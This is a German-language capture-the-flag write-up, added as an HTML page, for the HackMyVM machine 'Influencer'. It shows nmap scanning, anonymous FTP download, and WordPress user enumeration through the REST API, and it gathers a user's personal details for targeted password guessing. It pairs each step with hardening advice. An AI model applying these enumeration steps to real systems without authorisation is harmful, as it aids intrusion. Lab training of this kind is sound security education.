@@ -1,0 +1,1679 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Influencer - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Influencer - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container medium"> <!-- Klasse 'medium' für CSS-Farbanpassung -->
+            <h2>Medium</h2> <!-- Kein Inline Style, Farbe kommt von CSS über .level-container.medium h2 -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Farben per CSS für .medium .segment-X -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe per CSS für .medium .inner -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">ll (ls -la)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">jq</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">cupp</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3 -m http.server</div>
+                <div class="tool-item">nano</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                **Analyse:** Der erste Schritt in jedem Pentest ist die Aufklärung (Reconnaissance), um das Zielsystem und seine Netzwerkumgebung zu verstehen. Hier nutze ich `arp-scan` mit der Option `-l`, um alle aktiven Geräte im lokalen Netzwerk (typischerweise das Subnetz, in dem sich mein Kali-System befindet) zu identifizieren. Die Ausgabe wird dann mit `grep "PCS"` gefiltert, um speziell nach Geräten des Herstellers "PCS Systemtechnik" zu suchen, was oft auf VirtualBox-VMs hinweist. Schließlich extrahiere ich mit `awk '{print $1}'` nur das erste Feld der passenden Zeile, was die IP-Adresse ist.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Dieser Befehl ist sehr effektiv, um schnell die IP-Adresse des Zielsystems zu finden, wenn man den Netzwerkbereich kennt und weiß, dass es sich um eine virtuelle Maschine von Oracle/VirtualBox handelt (da diese oft MAC-Adressen mit dem PCS-Prefix verwenden). Es ist ein schnellerer Weg als ein vollständiger Subnetz-Scan mit Nmap, wenn man spezifische Kriterien hat.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Starte immer mit der Netzwerkaufklärung, um das Ziel zu lokalisieren. Nutze spezifische Filter, wenn Hinweise auf die Umgebung (wie VM-Plattformen) vorliegen.
+                <br>**Empfehlung (Admin):** Überwache ARP-Anfragen im Netzwerk, um ungewöhnliche Scans oder die Identifizierung von Systemen anhand von MAC-Adressen zu erkennen. Sei dir bewusst, dass Standard-MAC-Prefixe Hinweise auf die verwendete Virtualisierungsplattform geben können.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">192.168.2.40</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nachdem die IP-Adresse des Zielsystems (192.168.2.40) identifiziert wurde, führe ich einen schnellen Nmap-Scan durch. Die Optionen sind `-sS` (SYN-Scan, schnell und unauffällig), `-sC` (Standard-Skripte, identifiziert gängige Dienste und Schwachstellen), `-sV` (Versionserkennung der Dienste), `-p-` (scannt alle 65535 Ports) und `-T5` (aggressives Timing für Geschwindigkeit). Die Ausgabe wird wiederum gefiltert, diesmal mit `grep open`, um nur die Zeilen anzuzeigen, die offene Ports und die darauf laufenden Dienste auflisten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser erste Nmap-Scan gibt mir einen schnellen Überblick über die erreichbaren Dienste auf dem Ziel. Die Ergebnisse zeigen zwei offene Ports: 80/tcp (HTTP) und 2121/tcp (FTP). Das sind die primären Angriffsvektoren, die ich als nächstes untersuchen werde. Der Port 2121 für FTP ist untypisch und deutet möglicherweise auf eine Konfigurationsänderung oder einen spezifischen Zweck hin.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Beginne die Dienstidentifizierung mit schnellen Scans, um Prioritäten zu setzen. Konzentriere dich zuerst auf gängige oder untypisch konfigurierte offene Ports.
+                <br>**Empfehlung (Admin):** Führe regelmäßige Port-Scans deines eigenen Netzwerks durch, um unbeabsichtigt offene Ports zu identifizieren. Standard-Ports zu ändern kann eine minimale zusätzliche Hürde darstellen, ersetzt aber keine eigentliche Sicherheit.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.40 | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
+<span class="command">2121/tcp open  ftp     vsftpd 3.0.5</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Dies ist der vollständige Nmap-Scan vom Zielsystem. Ich habe denselben Befehl wie zuvor verwendet (`-sS`, `-sC`, `-sV`, `-p-`, `-T5`, `-AO` für Aggressive <span class="command">OS</span> detection). Die Ausgabe ist sehr detailliert und liefert wichtige Informationen. <span class="command">PORT</span> 80 läuft Apache httpd 2.4.52, <span class="command">PORT</span> 2121 läuft vsftpd 3.0.5. Die Skriptergebnisse (`|_http-server-header`, `|_http-title`, `| ftp-anon`, `| ftp-syst`) sind besonders wertvoll. Das HTTP-Titel "<span class="command">Apache2 Ubuntu Default Page: It works</span>" deutet auf eine Standardkonfiguration hin, aber das wird sich später als anders herausstellen. Der FTP-Scan zeigt, dass anonymer Login erlaubt ist (`<span class="password">Anonymous FTP login allowed (FTP code 230)</span>`) und listet die Dateien im anonymen FTP-Verzeichnis auf. Dazu gehören mehrere JPG-Dateien und eine `note.txt`. vsFTPd 3.0.5 wird als "<span class="command">secure, fast, stable</span>" beworben, ist aber auf dieser Version potenziell für bestimmte Schwachstellen anfällig, auch wenn der anonyme Zugriff hier das offensichtlichste Problem ist. Die <span class="command">OS</span>-Erkennung ist unsicher ("No exact <span class="command">OS</span> matches"), was aber oft der Fall ist. Die MAC Adresse <span class="command">08:00:27:55:E1:25 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span> bestätigt "PCS Systemtechnik", was meinen anfänglichen `arp-scan` Fund untermauert.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Nmap-Scan hat die offenen Dienste bestätigt und mir kritische Informationen für die nächsten Schritte geliefert: einen anonymen FTP-Zugang mit scheinbar interessanten Dateien und einen Webserver, der weiter untersucht werden muss. Der anonyme FTP-Zugriff ist eine erhebliche Schwachstelle, die sofort ausgenutzt werden sollte. Die vorhandene `note.txt` ist potenziell ein wichtiger Hinweis.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuche gefundene Dienste methodisch. Priorisiere offensichtliche Schwachstellen wie anonymen FTP-Zugriff. Lade alle zugänglichen Dateien herunter und analysiere sie auf Hinweise.
+                <br>**Empfehlung (Admin):** Deaktiviere anonymen FTP-Zugriff, es sei denn, er ist zwingend erforderlich und die geteilten Daten sind absolut unkritisch. Stelle sicher, dass keine sensiblen Dateien über FTP zugänglich sind. Halte Dienste wie Apache auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Deaktiviere Nmap-Skripte, die unnötige Informationen preisgeben könnten (z.B. ETag-Infos).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.40</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at 2025-06-12 21:30 CEST
+Nmap scan report for influencer (192.168.2.40)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+<span class="command">PORT     STATE SERVICE VERSION</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
+|_http-server-header: <span class="command">Apache/2.4.52 (Ubuntu)</span>
+|_http-title: <span class="command">Apache2 Ubuntu Default Page: It works</span>
+<span class="command">2121/tcp open  ftp     vsftpd 3.0.5</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed (FTP code 230)</span>
+| -rw-r--r--    1 0        0           11113 Jun 09  2023 facebook.jpg
+| -rw-r--r--    1 0        0           35427 Jun 09  2023 github.jpg
+| -rw-r--r--    1 0        0           88816 Jun 09  2023 instagram.jpg
+| -rw-r--r--    1 0        0           27159 Jun 09  2023 linkedin.jpg
+| -rw-r--r--    1 0        0              28 Jun 08  2023 note.txt
+|_-rw-r--r--    1 0        0          124263 Jun 09  2023 snapchat.jpg
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.2.199
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      <span class="command">vsFTPd 3.0.5 - secure, fast, stable</span>
+|_End of status
+MAC Address: <span class="command">08:00:27:55:E1:25 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Aggressive <span class="command">OS</span> guesses: <span class="command">OpenWrt 21.02 (Linux 5.4) (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (98%), Linux 4.19 (96%), Linux 6.0 (96%), Linux 5.0 - 5.14 (95%), Linux 2.6.32 (95%), Linux 3.3 (95%), Linux 4.15 (95%), Linux 3.2 - 4.14 (95%)</span>
+No exact <span class="command">OS</span> matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+<span class="command">Service Info: OS: Unix</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+1   0.14 ms influencer (192.168.2.40)
+
+<span class="command">Nmap done</span>: 1 IP address (1 host up) scanned in 14.99 seconds
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- ENDE TEIL 1 -->
+		        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                **Analyse:** Basierend auf dem Nmap-Ergebnis beginne ich die detaillierte Untersuchung des FTP-Dienstes auf Port 2121. Ich verwende den nativen `ftp`-Client, um eine Verbindung herzustellen. Gemäß der Nmap-Ausgabe versuche ich den anonymen Login, indem ich "anonymous" als Benutzernamen eingebe und das Passwort-Feld leer lasse (oder ebenfalls "anonymous" eingebe, was von vielen Servern akzeptiert wird, wenn anonymer Login erlaubt ist). Der FTP-Server (vsFTPd 3.0.5) bestätigt den Login mit dem Code 230. Ich wechsle dann in den Binary-Modus, um sicherzustellen, dass Dateien korrekt übertragen werden, und liste die Dateien im aktuellen Verzeichnis mit `ls -la` auf.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der anonyme FTP-Zugriff ist erfolgreich, was eine kritische Schwachstelle darstellt. Die Auflistung der Dateien zeigt eine Reihe von JPG-Dateien und eine `note.txt`. Dies bestätigt die in der Nmap-Ausgabe gesehenen Dateien und lenkt die Aufmerksamkeit sofort auf die Textdatei, da diese oft Hinweise oder Zugangsdaten enthält. Die Möglichkeit, Dateien über anonymes FTP zu lesen, ist ein direkter Einblick in potenziell sensible Informationen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Bei anonymem FTP-Zugriff immer alle verfügbaren Dateien herunterladen und sorgfältig prüfen. Achte besonders auf Textdateien, Konfigurationsdateien oder Bilder (wegen möglicher Steganografie).
+                <br>**Empfehlung (Admin):** Deaktiviere anonymen FTP-Zugriff vollständig, es sei denn, es gibt einen sehr spezifischen, kontrollierten Anwendungsfall. Wenn anonymen Zugriff erforderlich ist, stelle sicher, dass das Verzeichnis nur nicht-sensible, öffentliche Daten enthält und Schreibzugriff deaktiviert ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 192.168.2.40 -p 2121</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>Connected to 192.168.2.40.
+<span class="password">220 (vsFTPd 3.0.5)</span>
+Name (192.168.2.40:ccat): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="command"></span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> <span class="command">ls -la</span>
+<span class="password">229 Entering Extended Passive Mode (|||42387|)</span>
+150 Here comes the directory listing.
+dr-xr-xr-x    2 1000     65534        4096 Jun 09  2023 .
+dr-xr-xr-x    2 1000     65534        4096 Jun 09  2023 ..
+-rw-r--r--    1 0        0           11113 Jun 09  2023 facebook.jpg
+-rw-r--r--    1 0        0           35427 Jun 09  2023 github.jpg
+-rw-r--r--    1 0        0           88816 Jun 09  2023 instagram.jpg
+-rw-r--r--    1 0        0           27159 Jun 09  2023 linkedin.jpg
+-rw-r--r--    1 0        0              28 Jun 08  2023 note.txt
+-rw-r--r--    1 0        0          124263 Jun 09  2023 snapchat.jpg
+<span class="password">226 Directory send OK.</span>
+ftp>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Um alle Dateien schnell und effizient vom anonymen FTP-Server herunterzuladen, nutze ich `wget`. Der Befehl `wget -r` ermöglicht den rekursiven Download. Ich gebe die URL zum FTP-Verzeichnis an, einschließlich des Benutzernamens "Anonymous" und lasse das Passwort leer (was `wget` standardmäßig als anonymen Login interpretiert, oder man kann "Anonymous" als Passwort angeben). Der Port 2121 wird explizit genannt. Die Ausgabe von `wget` bestätigt den Verbindungsaufbau, den Login und das Herunterladen der Dateien.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** `wget -r` ist ein sehr praktisches Tool, um schnell komplette Verzeichnisstrukturen von FTP-Servern herunterzuladen. Der erfolgreiche Download aller Dateien, insbesondere der `note.txt` und der JPGs, verschafft mir lokalen Zugriff auf potenziell wichtige Informationen, die auf dem Zielsystem lagen. Dies ist ein direkter Gewinn durch die anonyme FTP-Schwachstelle.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutze Tools wie `wget` oder `lftp` für den schnellen rekursiven Download von FTP-Inhalten. Prüfe die heruntergeladenen Dateien auf offensichtliche Hinweise (Textdateien) und weniger offensichtliche (Metadaten in Bildern, Steganografie).
+                <br>**Empfehlung (Admin):** Erlaube niemals anonymen Schreibzugriff auf FTP-Server. Überprüfe regelmäßig die Inhalte von FTP-Verzeichnissen, die anonym zugänglich sind, um sicherzustellen, dass keine unbeabsichtigten oder sensiblen Dateien dort abgelegt wurden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer]
+└─# <span class="command">wget -r ftp://Anonymous:Anonymous@192.168.2.40:2121</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>--2025-06-12 22:33:37--  ftp://Anonymous:*password*@192.168.2.40:2121/
+           => »192.168.2.40:2121/.listing«
+Verbindungsaufbau zu 192.168.2.40:2121 … verbunden.
+Anmelden als Anonymous … <span class="password">Angemeldet!</span>
+==> SYST ... fertig.    ==> PWD ... fertig.
+==> TYPE I ... fertig.  ==> CWD nicht notwendig.
+==> PASV ... fertig.    ==> LIST ... fertig.
+
+<span class="command">192.168.2.40:2121/.listing</span>                          <span class="password">[ <=>                                                                                                  ]     534  --.-KB/s    in 0s      </span>
+.....
+...
+..
+<span class="password">2025-06-12 22:33:37 (142 MB/s) - »192.168.2.40:2121/snapchat.jpg« gespeichert [124263]</span>
+
+<span class="password">BEENDET --2025-06-12 22:33:37--</span>
+Verstrichene Zeit: 0,03s
+Geholt: 6 Dateien, 280K in 0,002s (113 MB/s)
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Nachdem die Dateien heruntergeladen wurden, navigiere ich in das lokale Verzeichnis, in das `wget` die Dateien gespeichert hat (typischerweise ein Unterverzeichnis, das nach der IP-Adresse und dem Port benannt ist). Mit `ll` (ein Alias für `ls -la`) liste ich die Dateien auf, um ihren Namen, ihre Größe und Berechtigungen zu sehen. Anschließend verwende ich `cat`, um den Inhalt der Datei `note.txt` anzuzeigen, da dies die vielversprechendste Datei für Hinweise ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die `ll` Ausgabe bestätigt, dass alle Dateien korrekt heruntergeladen wurden. Der Inhalt von `note.txt` ist ein klarer Hinweis: "- Change wordpress password". Dies ist ein sehr wichtiger Fund, da er direkt auf das Web-Ziel (WordPress) verweist und suggeriert, dass das Passwort schwach oder Standard sein könnte oder geändert werden muss. Dies priorisiert die Untersuchung der WordPress-Installation.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuche alle heruntergeladenen Dateien auf Hinweise, insbesondere Textdateien. Folge klaren Hinweisen wie dem, der in `note.txt` gefunden wurde, um die nächsten Schritte im Pentest zu bestimmen.
+                <br>**Empfehlung (Admin):** Speichere niemals sensible Informationen oder Hinweise (wie "Change password") in öffentlich zugänglichen Dateien, selbst auf internen oder Testsystemen. Gehe davon aus, dass alles, was öffentlich zugänglich ist, gefunden wird. Implementiere Richtlinien für sichere Passwortverwaltung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer/192.168.2.40:2121]
+└─# <span class="command">ll</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>insgesamt 292
+-rw-r--r-- 1 root root  11113  9. Jun 2023  facebook.jpg
+-rw-r--r-- 1 root root  35427  9. Jun 2023  github.jpg
+-rw-r--r-- 1 root root  88816  9. Jun 2023  instagram.jpg
+-rw-r--r-- 1 root root  27159  9. Jun 2023  linkedin.jpg
+-rw-r--r-- 1 root root     28  8. Jun 2023  note.txt
+-rw-r--r-- 1 root root 124263  9. Jun 2023  snapchat.jpg
+</pre>
+                </div>
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer/192.168.2.40:2121]
+└─# <span class="command">cat note.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>- Change wordpress password
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Der Hinweis in `note.txt` verweist auf WordPress. Um die WordPress-Installation unter einem aussagekräftigeren Namen als nur der IP-Adresse anzusprechen, trage ich den Hostnamen `influencer.hmv` in meine lokale `/etc/hosts` Datei ein. Dies ermöglicht es mir, im Browser und mit Tools wie `wpscan` oder `curl` statt der IP-Adresse den zugewiesenen Hostnamen zu verwenden. Ich benutze `vi` zum Bearbeiten der Datei, füge die Zeile `192.168.2.40 influencer.hmv` hinzu und speichere die Änderungen.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Das Eintragen des Hostnamens in die lokale `hosts`-Datei ist eine Standardvorgehensweise in Pentests, wenn das Ziel eine benannte virtuelle Maschine oder eine Webanwendung mit virtuellem Host ist. Es verbessert die Lesbarkeit der Befehle und URLs im weiteren Verlauf des Tests erheblich und simuliert eine DNS-Auflösung.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verwende die lokale `hosts`-Datei, um Zielen, die per IP erreichbar sind, aussagekräftige Namen zuzuweisen. Dies macht den Bericht klarer und die Befehle einfacher zu handhaben.
+                <br>**Empfehlung (Admin):** Stelle sicher, dass interne Hostnamen nicht leicht durch externe Angreifer erraten werden können oder Informationen über die interne Netzwerkstruktur preisgeben. Nutze interne DNS-Server anstelle von lokalen Host-Dateien für eine zentralisierte Verwaltung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>  <span class="command">192.168.2.40    influencer.hmv</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich rufe die Hauptseite der WordPress-Installation im Browser auf, um die Webanwendung zu erkunden und nach offensichtlichen Informationen zu suchen. Basierend auf dem Nmap-Titel erwartete ich zuerst die Standard-Apache-Seite, aber der Browseraufruf unter `http://192.168.2.40/wordpress/` zeigt direkt eine WordPress-Blog-Seite.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der direkte Aufruf der URL enthüllt die WordPress-Installation. Es ist wichtig, die Webanwendung manuell zu durchsuchen, um den Inhalt, die Struktur und potenzielle Hinweise zu verstehen, die automatisierte Tools möglicherweise übersehen. Ich sehe einen Blogbeitrag mit dem Titel "¡Hello world!" und den Namen "luna" als Autor. Das ist der erste identifizierte Benutzername.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Führe immer eine manuelle Erkundung der Webanwendung durch, zusätzlich zu automatisierten Scans. Achte auf Benutzernamen, Kommentare, Datumsangaben oder andere persönliche Informationen, die für Passwort-Angriffe nützlich sein könnten.
+                <br>**Empfehlung (Admin):** Veröffentliche keine Test- oder Entwicklungsseiten unbeabsichtigt. Stelle sicher, dass die Hauptseite die beabsichtigte Webanwendung zeigt. Überprüfe regelmäßig den öffentlich sichtbaren Inhalt auf sensible Informationen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>http://192.168.2.40/wordpress/
+
+My new blog!
+
+    Home
+
+<span class="command">Test</span>
+<span class="command">¡Hello world!</span>
+<span class="command">luna Jun 8, 2023 1 Comments</span>
+
+My name is Luna Shine, and I am thrilled to share my passion for fashion with all of you. Born on June 24, 1997, I have dedicated my life to…
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich navigiere zum Blogbeitrag "¡Hello world!" und finde dort einen Kommentar. Der Inhalt des Kommentars ist für meine Aufklärung extrem wertvoll. Es ist ein Kommentar von "Admin" an "Luna", der sie auffordert, ihr WordPress-Passwort zu ändern und keine persönlichen Informationen in Passwörtern zu verwenden. Dieser Kommentar wird sowohl auf Englisch als auch auf Spanisch angezeigt. Der Kommentar nennt explizit den Benutzernamen "Luna" und liefert einen klaren Hinweis darauf, dass das Passwort schwach ist oder persönliche Informationen enthalten könnte.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist ein Volltreffer für die Informationsbeschaffung! Der Kommentar liefert nicht nur den Benutzernamen "Luna", sondern auch einen starken Hinweis auf die Art der möglichen Schwachstelle: ein leicht zu erratendes Passwort basierend auf persönlichen Informationen. Dies ist eine direkte Einladung, einen Passwort-Angriff gegen den Benutzer "luna" mit einem speziell angefertigten Wörterbuch durchzuführen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Suche immer nach Kommentaren oder anderen öffentlich zugänglichen Inhalten, die Hinweise auf Benutzerkonten, Passwortrichtlinien oder andere Schwachstellen geben könnten. Nutze gefundene Informationen (wie Namen, Geburtsdaten, Haustiere, Firmennamen aus Profilen oder Kommentaren) für gezielte Passwort-Angriffe.
+                <br>**Empfehlung (Admin):** Überwache Kommentare auf sensible Informationen. Implementiere strenge Passwortrichtlinien und erzwinge deren Einhaltung. Verwende keine Standardbenutzernamen wie "Admin" für Kommentare oder andere sichtbare Aktivitäten, es sei denn, dies ist absolut notwendig.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>http://192.168.2.40/wordpress/index.php/2023/06/08/hola-mundo/
+
+<span class="command">One thought on “¡Hello world!”</span>
+
+    <span class="command">Admin says:	</span>
+    8 de June de 2023 at 15:34	
+
+    <span class="password">Luna, remember to change your password before uploading the website, and stop using personal information in your passwords. Put some effort into it.</span>
+
+    <span class="password">Luna, recuerda antes de subir la web cambiar tu contraseña y dejar de usar información personal en las contraseñas. Dedícale un poco más de esfuerzo.</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Um weitere Benutzernamen zu identifizieren und Informationen über den Benutzer "luna" zu erhalten, nutze ich die WordPress REST API. Der Endpunkt `/wp-json/wp/v2/users/` kann Informationen über Benutzer preisgeben. Ich verwende `curl` mit der Option `-s` (silent) und leite die Ausgabe an `jq` weiter, um die JSON-Antwort formatiert anzuzeigen. Ich teste die Benutzer-IDs 1 und 2.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der Aufruf mit ID 1 liefert detaillierte Informationen über den Benutzer "luna", einschließlich des Benutzernamens, eines Links zur Autorenseite und Avataren. Dies bestätigt "luna" als gültigen Benutzer und Hauptautor des Blogs. Der Aufruf mit ID 2 liefert einen "Invalid user ID" Fehler, was bedeutet, dass Benutzer mit dieser ID nicht existieren (oder nicht über die API zugänglich sind). Die REST API kann standardmäßig Informationen über Benutzer preisgeben und ist eine häufige Quelle für Benutzernamen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutze die WordPress REST API (`/wp-json/wp/v2/users/`) zur Benutzer-Enumeration. Beginne mit ID 1 und erhöhe, bis ungültige IDs gefunden werden.
+                <br>**Empfehlung (Admin):** Deaktiviere den öffentlichen Zugriff auf den `/wp-json/wp/v2/users/` Endpunkt, wenn keine externe Anwendung ihn benötigt. Dies kann über Plugins oder Webserver-Konfiguration (z.B. `.htaccess`) erfolgen. Entferne Standard-Benutzer wie "admin" und verwende stattdessen eindeutige Benutzernamen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s http://192.168.2.40/wordpress/index.php/wp-json/wp/v2/users/1 | jq</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>{
+  <span class="command">"id": 1</span>,
+  <span class="command">"name": "luna"</span>,
+  "url": <span class="command">"http://192.168.1.167/wordpress"</span>, <span class="password"><-- Interessanter interner Link!</span>
+  "description": "",
+  "link": <span class="command">[Link: http://192.168.2.40/wordpress/index.php/author/luna/ | Ziel: http://192.168.2.40/wordpress/index.php/author/luna/]</span>,
+  <span class="command">"slug": "luna"</span>,
+  <span class="command">"avatar_urls"</span>: {
+    <span class="command">"24"</span>: <span class="command">"https://secure.gravatar.com/avatar/642f32e56d7b7b2dec23a084a9f4677527f4b07d41041a5508049a3f9267c148?s=24&d=mm&r=g"</span>,
+    <span class="command">"48"</span>: <span class="command">"https://secure.gravatar.com/avatar/642f32e56d7b7b2dec23a084a9f4677527f4b07d41041a5508049a3f9267c148?s=48&d=mm&r=g"</span>,
+    <span class="command">"96"</span>: <span class="command">"https://secure.gravatar.com/avatar/642f32e56d7b7b2dec23a084a9f4677527f4b07d41041a5508049a3f9267c148?s=96&d=mm&r=g"</span>
+  },
+  "meta": [],
+  "_links": {
+    "self": [
+      {
+        "href": <span class="command">"http://192.168.2.40/wordpress/index.php/wp-json/wp/v2/users/1"</span>,
+        "targetHints": {
+          "allow": [
+            <span class="command">"GET"</span>
+          ]
+        }
+      }
+    ],
+    "collection": [
+      {
+        "href": <span class="command">"http://192.168.2.40/wordpress/index.php/wp-json/wp/v2/users"</span>
+      }
+    ]
+  }
+}
+</pre>
+                </div>
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s http://192.168.2.40/wordpress/index.php/wp-json/wp/v2/users/2 | jq</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>{
+  <span class="password">"code": "rest_user_invalid_id"</span>,
+  <span class="password">"message": "Invalid user ID."</span>,
+  <span class="command">"data"</span>: {
+    <span class="command">"status": 404</span>
+  }
+}
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit dem identifizierten Benutzernamen "luna" und dem Hinweis, dass das Passwort persönliche Informationen enthält, nutze ich nun das spezialisierte Tool `wpscan` für eine detaillierte Schwachstellenanalyse der WordPress-Installation. Ich verwende die Optionen `--url` für die Ziel-URL (unter Verwendung des zuvor hinzugefügten Hostnamens `influencer.hmv`), `--api-token` (hier aus Sicherheitsgründen im Bericht maskiert) für erweiterte Prüfungen, `--enumerate ap,u` um angreifbare Plugins ('ap') und Benutzer ('u') zu enumerieren, und `--plugins-detection aggressive` für eine gründlichere Pluginsuche.
+            </p>
+            <p class="evaluation">
